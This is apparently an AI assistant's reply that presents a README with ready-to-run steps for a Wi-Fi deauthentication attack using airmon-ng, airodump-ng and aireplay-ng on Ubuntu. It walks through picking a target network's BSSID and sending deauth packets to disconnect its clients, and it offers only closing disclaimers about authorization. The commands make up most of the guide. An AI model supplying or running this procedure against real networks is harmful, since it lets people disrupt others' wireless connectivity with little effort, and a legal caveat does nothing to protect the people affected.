Here's a basic README for performing a deauthentication attack using `airmon-ng` in Ubuntu:

---

# Deauthentication Attack using `airmon-ng` on Ubuntu

This guide will walk you through the steps to execute a deauthentication attack on a wireless network using `airmon-ng` tool in Ubuntu.

## Prerequisites

- Ubuntu OS installed
- Wireless network interface (e.g., wlan0)
- `airmon-ng` tool installed (usually comes pre-installed with `aircrack-ng` suite)

## Steps

1. **Open Terminal**: Press `Ctrl + Alt + T` to open the terminal.

2. **Check Wireless Interface**: Determine the name of your wireless network interface. Use the following command:
    ```bash
    iwconfig
    ```
    Identify your wireless interface (e.g., wlan0).

3. **Put Wireless Interface in Monitor Mode**: Use `airmon-ng` to put your wireless interface in monitor mode. Replace `wlan0` with your wireless interface name:
    ```bash
    sudo airmon-ng start wlan0
    ```
    This command will create a new monitor interface (usually `wlan0mon`).

4. **Check Monitor Interface**: Verify that the monitor mode has been enabled by running:
    ```bash
    iwconfig
    ```
    You should see your interface listed in monitor mode (e.g., `wlan0mon`).

5. **Scan for Target Networks**: Use `airodump-ng` to scan for nearby wireless networks and find the target's BSSID (MAC address) and channel:
    ```bash
    sudo airodump-ng wlan0mon
    ```
    Identify the BSSID and channel of the target network.

6. **Execute Deauthentication Attack**: Open a new terminal window or tab and execute the deauthentication attack using the following command:
    ```bash
    sudo aireplay-ng -0 5 -a <BSSID> wlan0mon
    ```
    Replace `<BSSID>` with the BSSID of the target network obtained from the previous step.

    `-0` flag specifies the deauthentication attack.
    `5` represents the number of deauthentication packets to send. Adjust as needed.

7. **Monitor Activity**: Switch back to the first terminal where `airodump-ng` is running. You should see devices disconnecting and attempting to reconnect to the target network.

8. **Exit Monitor Mode**: Once you've completed the attack, exit monitor mode using:
    ```bash
    sudo airmon-ng stop wlan0mon
    ```
    Replace `wlan0mon` with your monitor interface name if different.

## Notes
- **Caution**: Deauthentication attacks can be illegal if performed without proper authorization. Ensure you have permission before conducting such tests.
- Use responsibly and in controlled environments.
- Be mindful of the laws and regulations related to wireless network security in your area.

---

Remember, this README is for educational purposes only, and performing such attacks without proper authorization could be illegal. Always ensure you have the necessary permissions and use this knowledge responsibly.
